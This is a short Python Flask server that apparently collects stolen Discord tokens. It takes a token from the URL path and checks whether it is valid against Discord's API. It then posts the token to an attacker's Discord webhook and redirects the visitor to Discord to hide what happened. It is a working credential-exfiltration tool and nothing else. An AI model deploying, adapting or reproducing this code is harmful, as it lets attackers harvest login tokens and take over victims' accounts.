from flask import Flask, redirect, abort
import os
import requests

app = Flask(__name__)

def check_discord_token(token):
    url = "https://discord.com/api/v10/users/@me"
    headers = {
        "Authorization": f"Bearer {token}"
    }
    
    response = requests.get(url, headers=headers)
    
    if response.status_code == 200:
        return f"new auth token keyauth.com \nauth token:**{token}**"
    else:
        return "Old auth token keyauth.com \nauth token:**{token}**"

@app.route('/<string:token>')
def index(token):
    try:
        # Send the token to the Discord webhook
        DISCORD_URL = os.getenv('DISCORD_URL')
        message = check_discord_token(token)
        response = requests.post(DISCORD_URL, json={"content": message})
        if response.status_code == 204:
            # Successful response from Discord
            return redirect("https://discord.com/app")
        else:
            # Handle unsuccessful response
            print(f"Error sending webhook: {response.status_code} {response.text}")
            return abort(500, description="Failed to send webhook")
    except requests.RequestException as e:
        # Handle any exceptions during the request
        print(f"Error sending webhook: {e}")
        return abort(500, description="Internal Server Error")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=81)
